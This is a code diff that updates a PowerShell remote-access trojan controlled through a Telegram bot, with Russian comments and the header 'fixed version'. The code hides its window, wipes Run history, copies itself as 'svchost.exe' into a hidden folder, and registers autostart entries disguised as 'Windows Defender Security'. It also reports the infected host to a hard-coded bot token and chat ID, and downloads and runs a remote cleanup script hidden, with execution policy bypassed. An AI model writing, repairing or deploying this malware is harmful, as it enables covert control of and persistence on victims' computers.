@@ -1,4 +1,4 @@
-# RAT через Telegram Bot
+# RAT через Telegram Bot - ИСПРАВЛЕННАЯ ВЕРСИЯ
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -17,7 +17,9 @@ $windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -
 $windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null
 
 # Очистка истории RUN при запуске
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+try {
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+} catch { }
 
 # Функция отправки сообщений с правильной кодировкой
 function Send-Telegram {
@@ -123,9 +125,11 @@ if (!(Test-Path $hiddenFolder)) {
 }
 $scriptPath = "$hiddenFolder\svchost.exe"
 
-# Копируем скрипт в скрытое место
-$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
-$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+# Копируем скрипт в скрытое место только если его там нет
+if (!(Test-Path $scriptPath)) {
+    $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
+    $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+}
 
 # Установка в несколько мест автозагрузки для надежности
 $regPaths = @(
@@ -145,6 +149,7 @@ foreach ($regPath in $regPaths) {
 # Основные переменные
 $currentDir = "C:\"
 $global:LastSentMessage = ""
+$global:LastUpdateId = 0
 
 # Отправка информации о запуске
 Send-Telegram "RAT активирован на $env:COMPUTERNAME
@@ -240,72 +245,26 @@ $($fileList -join "`n")"
                             Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                             
                             try {
-                                # Загружаем и выполняем скрипт очистки
+                                # Скачиваем скрипт очистки
                                 $cleanupScript = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/imsog/system-scanner/refs/heads/main/cleanup.ps1" -UseBasicParsing
                                 
-                                # Создаем временный файл для скрипта очистки
+                                # Сохраняем скрипт очистки
                                 $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
                                 $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
                                 
                                 # Запускаем скрипт очистки в отдельном процессе
-                                $process = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" -PassThru
+                                $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+                                $processInfo.FileName = "powershell.exe"
+                                $processInfo.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`""
+                                $processInfo.CreateNoWindow = $true
+                                $processInfo.UseShellExecute = $false
                                 
-                                # Ждем завершения процесса очистки
-                                $process.WaitForExit(30000) # 30 секунд таймаут
+                                $process = [System.Diagnostics.Process]::Start($processInfo)
                                 
-                                if ($process.HasExited -and $process.ExitCode -eq 0) {
-                                    Send-Telegram "✅ Самоуничтожение успешно завершено"
-                                } else {
-                                    Send-Telegram "⚠️ Самоуничтожение завершено с ошибками, выполняется ручная очистка..."
-                                    
-                                    # Ручная очистка если автоматическая не сработала
-                                    # Очистка истории RUN
-                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-                                    
-                                    # Удаление из автозагрузки
-                                    foreach ($regPath in $regPaths) {
-                                        try {
-                                            Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
-                                        } catch { }
-                                    }
-                                    
-                                    # Удаление файлов
-                                    $filesToDelete = @(
-                                        $scriptPath,
-                                        $MyInvocation.MyCommand.Path,
-                                        $cleanupPath
-                                    )
-                                    
-                                    foreach ($file in $filesToDelete) {
-                                        if (Test-Path $file) { 
-                                            try {
-                                                Remove-Item $file -Force -ErrorAction SilentlyContinue 
-                                            } catch {
-                                                # Пытаемся переименовать и удалить после перезагрузки
-                                                try {
-                                                    $newName = "$file.todelete"
-                                                    Rename-Item $file $newName -ErrorAction SilentlyContinue
-                                                    cmd /c "del /f /q `"$newName`"" 2>&1 | Out-Null
-                                                } catch { }
-                                            }
-                                        }
-                                    }
-                                    
-                                    # Завершаем процессы RAT
-                                    $currentPID = $pid
-                                    Get-WmiObject Win32_Process | Where-Object { 
-                                        $_.CommandLine -like "*$scriptPath*" -or 
-                                        $_.CommandLine -like "*$($MyInvocation.MyCommand.Path)*" 
-                                    } | ForEach-Object { 
-                                        if ($_.ProcessId -ne $currentPID) {
-                                            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
-                                        }
-                                    }
-                                    
-                                    Send-Telegram "✅ Ручная очистка завершена, RAT уничтожен"
-                                }
+                                # Даем время на запуск cleanup скрипта
+                                Start-Sleep -Seconds 3
                                 
-                                # Завершаем текущий процесс
+                                # Завершаем текущий процесс RAT
                                 Stop-Process -Id $pid -Force
                                 
                             } catch {
@@ -315,11 +274,10 @@ $($fileList -join "`n")"
                                 try {
                                     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                     foreach ($regPath in $regPaths) {
-                                        Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue -ErrorAction SilentlyContinue
+                                        Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
                                     }
                                     Stop-Process -Id $pid -Force
                                 } catch {
-                                    # Принудительное завершение
                                     cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
                                 }
                             }
